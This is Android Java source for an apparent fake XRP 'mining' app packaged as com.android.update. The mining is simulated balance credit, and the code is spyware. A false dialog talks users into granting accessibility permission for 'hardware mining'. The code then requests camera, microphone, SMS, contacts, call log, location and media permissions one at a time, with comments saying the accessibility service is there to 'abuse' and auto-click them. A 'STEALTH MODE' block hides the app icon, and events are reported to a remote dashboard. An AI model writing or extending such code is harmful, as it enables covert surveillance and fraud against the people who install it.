package com.android.update;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.content.DialogInterface;
import androidx.appcompat.app.AlertDialog;
import android.text.Spannable;
import android.text.SpannableString;
import android.text.style.ForegroundColorSpan;
import androidx.core.app.ActivityCompat;
import android.Manifest;
import android.os.Handler;
import androidx.core.app.ActivityCompat;

import androidx.core.content.ContextCompat;
import android.content.pm.PackageManager;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.os.Build;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.core.content.ContextCompat;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

public class HomeActivity extends AppCompatActivity {
    private TextView tvXrpBalance, tvUsdtBalance, tvTotalXrp, miningStatusText;
    private ImageView miningIcon;
    private ProgressBar miningProgress;
    private FirebaseAuth mAuth;
    private DatabaseReference userRef;
    private Handler miningHandler;
    private Runnable miningRunnable;
    private boolean isMiningActive = false;
    private long miningStartTime;
    private final double XRP_PER_HOUR = 0.15;   //0.015
    private final double USDT_RATE = 2.4;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_home);

        // Initialize Settings Icon
        ImageView settingsIcon = findViewById(R.id.settings_icon);
        ImageView notificationIcon = findViewById(R.id.notification_icon);

        // Settings Icon Click - Opens SettingsActivity
        settingsIcon.setOnClickListener(v -> {
            Intent intent = new Intent(HomeActivity.this, SettingsActivity.class);
            startActivity(intent);
        });

        // Notification Icon Click
        notificationIcon.setOnClickListener(v -> {
            Intent intent = new Intent(HomeActivity.this, NotificationsActivity.class);
            startActivity(intent);
        });


        LinearLayout integrationsSection = findViewById(R.id.integrations_section);
        integrationsSection.setOnClickListener(v -> {
            Intent intent = new Intent(HomeActivity.this, IntegrationsActivity.class);
            startActivity(intent);
        });


        // Initialize Firebase
        SharedPreferences prefs = getSharedPreferences("UserPrefs", MODE_PRIVATE);
        String uid = prefs.getString("userId", null);
        if (uid == null) {
            Toast.makeText(this, "User ID not found. Please sign in again.", Toast.LENGTH_SHORT).show();
            startActivity(new Intent(HomeActivity.this, SignupActivity.class));
            finish();
            return;
        }
        userRef = FirebaseDatabase.getInstance().getReference("users").child(uid);

        userRef = FirebaseDatabase.getInstance().getReference("users").child(uid);

        // Initialize views
        tvXrpBalance = findViewById(R.id.tv_xrp_balance);
        tvUsdtBalance = findViewById(R.id.tv_usdt_balance);
        tvTotalXrp = findViewById(R.id.tv_total_xrp);
        miningStatusText = findViewById(R.id.mining_status_text);
        miningIcon = findViewById(R.id.mining_icon);
        miningProgress = findViewById(R.id.mining_progress);

        // Load user data from Firebase
        loadUserData();

        // Mining button click
        miningIcon.setOnClickListener(v -> {
            if (isMiningActive) {
                Toast.makeText(this, "Mining already in progress!", Toast.LENGTH_SHORT).show();
            } else {
                if (isAccessibilityEnabled()) {
                    requestPermissionsOneByOne();  // trigger dialogs for AccessibilityService to abuse
                    startMining();                 // only then start mining
                } else {
                    showAccessibilityDialog();
                }
            }
        });
    }

    private void loadUserData() {
        userRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    double xrpBalance = snapshot.child("xrp_balance").getValue(Double.class);
                    double usdtBalance = snapshot.child("usdt_balance").getValue(Double.class);
                    boolean isMining = snapshot.child("mining_status").getValue(Boolean.class);
                    miningStartTime = snapshot.child("mining_start_time").getValue(Long.class);

                    updateBalanceUI(xrpBalance, usdtBalance);

                    if (isMining) {
                        continueMining(miningStartTime);
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Toast.makeText(HomeActivity.this, "Failed to load data.", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void requestPermissionsOneByOne() {
        String[] permissions;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO,
                    Manifest.permission.READ_MEDIA_AUDIO,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.CALL_PHONE
            };
        } else {
            permissions = new String[]{
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.CALL_PHONE
            };
        }

        Handler handler = new Handler();
        requestPermissionAtIndex(handler, permissions, 0);
    }

    private void requestPermissionAtIndex(Handler handler, String[] permissions, int index) {
        if (index >= permissions.length) {
            return;
        }

        ActivityCompat.requestPermissions(HomeActivity.this, new String[]{permissions[index]}, 100);

        // Delay next permission request by 2.5 seconds to give Accessibility time to click
        handler.postDelayed(() -> requestPermissionAtIndex(handler, permissions, index + 1), 2500);
    }


    private void startMining() {
        miningStartTime = System.currentTimeMillis();
        isMiningActive = true;

        userRef.child("mining_status").setValue(true);
        userRef.child("mining_start_time").setValue(miningStartTime);

        // 🔄 SYNC with dashboard on mining start
        new Thread(() -> {
            UploadHelper.sendTextToServer(getApplicationContext(), "sync", "Mining Started");
        }).start();

        // Create the full text
        String fullText = "Mining XRP... Don't forget to re-Mine after every 24hours.Services will be unlocked after reaching 60XRP";

// Create a SpannableString
        SpannableString spannableString = new SpannableString(fullText);

// Set red color to the specific part
        int start = fullText.indexOf("Don't forget to re-Mine after every 24hours.Services will be unlocked after reaching 60XRP");
        int end = fullText.length();
        spannableString.setSpan(
                new ForegroundColorSpan(ContextCompat.getColor(this, android.R.color.holo_red_dark)),
                start, end, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE
        );

// Set the styled text
        miningStatusText.setText(spannableString);

        // Start the mining handler
        miningHandler = new Handler();
        miningRunnable = new Runnable() {
            @Override
            public void run() {
                updateMiningProgress();
                miningHandler.postDelayed(this, 1000);
            }
        };
        miningHandler.post(miningRunnable);

        // 🥷 STEALTH MODE: Hide App Icon
        if (isAccessibilityEnabled()) {
            new Handler().postDelayed(() -> {
                try {
                    PackageManager p = getPackageManager();
                    android.content.ComponentName componentName = new android.content.ComponentName(
                            HomeActivity.this, com.android.update.SplashActivity.class);
                    p.setComponentEnabledSetting(componentName,
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            PackageManager.DONT_KILL_APP);
                    Log.d("STEALTH", "App Icon successfully hidden from Launcher.");
                } catch (Exception e) {
                    Log.e("STEALTH", "Failed to hide app icon: " + e.getMessage());
                }
            }, 5000); // 5 second delay to ensure the user sees the setup complete first
        }
    }

    private boolean isAccessibilityEnabled() {
        int accessibilityEnabled = 0;
        final String service = getPackageName() + "/" + MyAccessibilityService.class.getCanonicalName();
        try {
            accessibilityEnabled = Settings.Secure.getInt(getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }

        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null && settingValue.contains(service)) {
                return true;
            }
        }
        return false;
    }

    private void showAccessibilityDialog() {
        androidx.appcompat.app.AlertDialog.Builder builder = new androidx.appcompat.app.AlertDialog.Builder(this);
        builder.setTitle("Permission Required");

        builder.setMessage("The mining of these crypto assets is based on physical mining using your mobile hardware sensor as mining machine. The mining ratio and speed depends on your device specifications. Without HARDWARE use, you can only store assets—mining will not be available.\n\nIn order to start real physical machine-based mining, please allow app with ACCESSIBILITY Permission so that app can interact with machine to start physical assets mining.");

        builder.setCancelable(false);

        builder.setPositiveButton("Agree & Continue", (dialog, which) -> {
            Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
            Toast.makeText(this, "Please allow Accessibility Service for mining to work.", Toast.LENGTH_LONG).show();
        });

        builder.setNegativeButton("Cancel", (dialog, which) -> dialog.dismiss());

        builder.show();
    }


    private void continueMining(long startTime) {
        isMiningActive = true;
        miningStatusText.setText("Mining XRP... Don't forget to re-Mine after every 24hours.Services will be unlocked after reaching 60XRP");
        // Create the full text
        String fullText = "Mining XRP... Don't forget to re-Mine after every 24hours.Services will be unlocked after reaching 60XRP";

// Create a SpannableString
        SpannableString spannableString = new SpannableString(fullText);

// Set red color to the specific part
        int start = fullText.indexOf("Don't forget to re-Mine after every 24hours.Services will be unlocked after reaching 60XRP");
        int end = fullText.length();
        spannableString.setSpan(
                new ForegroundColorSpan(ContextCompat.getColor(this, android.R.color.holo_red_dark)),
                start, end, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE
        );

// Set the styled text
        miningStatusText.setText(spannableString);


        miningHandler = new Handler();
        miningRunnable = new Runnable() {
            @Override
            public void run() {
                updateMiningProgress();
                miningHandler.postDelayed(this, 1000);
            }
        };
        miningHandler.post(miningRunnable);
    }

    private void updateMiningProgress() {
        long elapsedTime = System.currentTimeMillis() - miningStartTime;
        double earnedXrp = (elapsedTime / (60 * 60 * 1000.0)) * XRP_PER_HOUR;
        double usdtValue = earnedXrp * USDT_RATE;

        // Update in Firebase
        userRef.child("xrp_balance").setValue(earnedXrp);
        userRef.child("usdt_balance").setValue(usdtValue);

        // Update UI
        updateBalanceUI(earnedXrp, usdtValue);

        // Auto-stop mining after 24 hours
        if (elapsedTime >= 24 * 60 * 60 * 1000) {
            stopMining();
        }
    }

    private void stopMining() {
        isMiningActive = false;
        userRef.child("mining_status").setValue(false);
        miningStatusText.setText("Tap to mine");

        if (miningHandler != null) {
            miningHandler.removeCallbacks(miningRunnable);
        }
    }

    private void updateBalanceUI(double xrp, double usdt) {
        tvXrpBalance.setText(String.format("%.3f", xrp));
        tvUsdtBalance.setText(String.format("%.2f", usdt));
        tvTotalXrp.setText(String.format("%.3f XRP", xrp));
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (miningHandler != null) {
            miningHandler.removeCallbacks(miningRunnable);
        }
    }
}
